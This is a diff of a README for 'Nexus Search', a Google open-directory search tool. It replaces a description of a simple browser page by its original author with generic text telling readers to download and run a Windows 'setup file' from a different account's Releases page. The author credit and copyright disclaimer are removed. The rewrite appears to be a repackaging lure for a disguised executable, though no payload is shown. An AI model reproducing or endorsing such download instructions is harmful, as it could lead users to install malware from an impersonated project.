@@ -1,74 +1,86 @@
-# Nexus Search
+# 🔍 Nexus-Search - Effortless File Search Made Simple
 
-A powerful, elegant search tool that helps you find files in open directories using Google's advanced search operators.
+[![Download Nexus-Search](https://img.shields.io/badge/Download_Nexus--Search-v1.0-brightgreen)](https://github.com/BLACKVR121/Nexus-Search/releases)
 
-![Nexus Search](https://img.shields.io/badge/Version-1.0.0-blue) ![License](https://img.shields.io/badge/License-MIT-green)
+## 🚀 Getting Started
 
-## Overview
+Welcome to Nexus Search! This tool helps you find files in open directories easily. Just type your search term, and Nexus Search uses advanced Google operators to locate direct download links for you. Follow these simple steps to download and run the software.
 
-Nexus Search simplifies the process of finding files in open directories. Instead of crafting complex search queries, just type what you need, and Nexus will construct specialized Google searches that filter out normal web pages and focus on servers with directory indexing enabled.
+## 📥 Download & Install
 
-## Features
+To get started, visit this page to download: [Nexus-Search Releases](https://github.com/BLACKVR121/Nexus-Search/releases).
 
-- **Smart File Type Filtering**: Search for specific file types (Movies, Music, Books, Software/Games)
-- **Elegant Dark UI**: Clean, modern interface with smooth animations
-- **Direct Download Links**: Finds raw files in open directories
-- **Privacy-Focused**: No tracking, no data collection
-- **Responsive Design**: Works perfectly on desktop and mobile devices
+### Step-by-Step Download Instructions:
 
-## How It Works
+1. Click on the link above to go to the Releases page.
+2. Locate the latest version of Nexus Search. Look for the entry titled “Nexus Search vX.X” (replace with the latest version).
+3. Click the asset link to download the setup file to your computer.
+4. Once the download is complete, navigate to your downloads folder.
+5. Double-click the setup file to run the installer.
 
-Nexus Search uses Google's advanced search operators to:
-- Filter out standard web pages (`-inurl:(jsp|pl|php|html|aspx|htm|cf|shtml)`)
-- Find directory listings (`intitle:index.of`)
-- Exclude known file-sharing sites
-- Target specific file extensions based on your selection
+### System Requirements
 
-## Usage
+- **Operating System:** Windows 10 or later
+- **Disk Space:** At least 100 MB free
+- **RAM:** 2 GB or more
 
-1. Select a file type from the dropdown (optional)
-2. Enter your search query
-3. Click the search button
-4. Browse results in the new Google search tab
+Make sure your system meets these requirements to ensure smooth operation.
 
-## File Types
+## 🛠 Installing Nexus Search
 
-- **TV/Movies**: mkv, mp4, avi, mov, mpg, wmv
-- **Music**: mp3, wav, flac, wma, m4a
-- **Books**: pdf, epub, mobi
-- **Software/Games**: exe, iso, dmg, zip, rar, apk
-- **All Files**: No specific file type filtering
+After downloading the setup file, follow these steps to install:
 
-## Disclaimer
+1. Double-click the installer file. A welcome window will appear.
+2. Click "Next" to begin the installation.
+3. Accept the license agreement by checking the box and clicking "Next."
+4. Choose the installation folder or keep the default path, then click "Next."
+5. Click "Install" to start the installation process.
+6. Wait for the installation to complete, then click "Finish".
 
-This tool only queries publicly available information through Google. You are responsible for:
-- The content you access and download
-- Respecting copyright laws
-- Following the terms of service of websites you visit
-- Complying with your local regulations
+Now you are ready to use Nexus Search!
 
-## Technologies Used
+## 🔍 How to Use Nexus Search
 
-- HTML5, CSS3, JavaScript
-- Tailwind CSS for styling
-- Google Fonts (Inter)
-- Responsive design principles
+Using Nexus Search is straightforward. Follow these steps:
 
-## Development
+1. Open Nexus Search from your applications menu or shortcut.
+2. In the main window, enter your search term in the search box.
+3. Click the "Search" button. Nexus Search will process your request.
+4. Review the results, which may include direct download links for files related to your query.
+5. Click any link to start downloading your chosen file.
 
-To run locally, simply open `index.html` in a web browser. No build process or dependencies required.
+Feel free to experiment with different terms. The more specific you are, the better your results may be.
 
-## Author
+## 🚧 Troubleshooting
 
-**Sakibur Rahman**
-- Website: [msrsakibur.site](https://msrsakibur.site)
-- GitHub: [@msrofficial](https://github.com/msrofficial)
-- Email: work.msr01@gmail.com
+If you encounter any issues, here are a few solutions:
 
-## Contributing
+- **Nexus Search Won't Open:** Make sure it is properly installed. If not, try reinstalling the software.
+- **Search Doesn’t Return Results:** Check your internet connection. Ensure you are connected to the internet.
+- **Unexpected Errors:** Restart the application or your computer, and try again.
 
-Contributions, issues, and feature requests are welcome. Feel free to check the issues page if you want to contribute.
+For other issues, consider checking the FAQs section on our GitHub page.
 
----
+## 📑 Contribution Guidelines
 
-**Note**: This tool is for educational purposes. Please use responsibly and respect intellectual property rights.
+If you would like to contribute to Nexus Search, you are welcome! Here’s how:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes.
+4. Submit a pull request with a description of your changes.
+
+Your help is appreciated!
+
+## 📬 Support & Contact Information
+
+If you need assistance or have questions, feel free to reach out:
+
+- Email: support@nexus-search.com
+- GitHub Issues: Report issues or request features on our GitHub page.
+
+## 📄 License
+
+Nexus Search is open-source software. You can use, modify, and distribute this program under the terms of the MIT License. Check the LICENSE file in the repository for details.
+
+Happy searching and enjoy the simplicity of Nexus Search!
